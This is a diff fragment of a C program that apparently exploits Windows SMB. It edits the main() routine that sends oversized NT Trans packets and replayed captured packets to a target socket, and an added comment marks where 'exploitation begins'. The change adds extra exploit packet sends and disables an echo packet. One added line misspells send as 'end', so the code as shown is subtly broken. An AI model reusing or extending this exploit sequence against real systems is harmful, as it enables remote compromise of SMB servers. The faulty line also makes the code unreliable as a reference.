@@ -8593,12 +8593,20 @@ int main(int argc, char** argv)
         WSACleanup();
         ExitProcess(0);
     }
-
-    //send huge NT trans request
+  
+    //exploitation begins here
+    //send huge NT trans packet with base64 data
     printf("sending big NT Trans packet!\n");
-    ret = send(sock, (char*)NTTranspacket, sizeof(NTTranspacket) - 1, 0);
-    
+    send(sock, (char*)NTTranspacket, sizeof(NTTranspacket) - 1, 0);
+    send(sock, (char*)NTTranspacket2, sizeof(NTTranspacket2) - 1, 0);
+    send(sock, (char*)NTTranspacket3, sizeof(NTTranspacket3) - 1, 0);
+    send(sock, (char*)NTTranspacket4, sizeof(NTTranspacket4) - 1, 0);
+    send(sock, (char*)NTTranspacket5, sizeof(NTTranspacket5) - 1, 0);
+    end(sock, (char*)NTTranspacket6, sizeof(NTTranspacket6) - 1, 0);
+    send(sock, (char*)NTTranspacket7, sizeof(NTTranspacket7) - 1, 0);
+ 
     //big code coming in
+    //document what each does
     send(sock, (char*)peer0_12, sizeof(peer0_12) - 1, 0);
     send(sock, (char*)peer0_13, sizeof(peer0_13) - 1, 0);
     send(sock, (char*)peer0_14, sizeof(peer0_14) - 1, 0);
@@ -8698,8 +8706,8 @@ int main(int argc, char** argv)
     // SEND MORE PACKETS HERE
     
     //send echo packet
-    printf("sending echo packet!\n");
-    ret = send(sock, (char*)Echopacket, sizeof(Echopacket) - 1, 0);
+    //printf("sending echo packet!\n");
+    //send(sock, (char*)Echopacket, sizeof(Echopacket) - 1, 0);
     
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
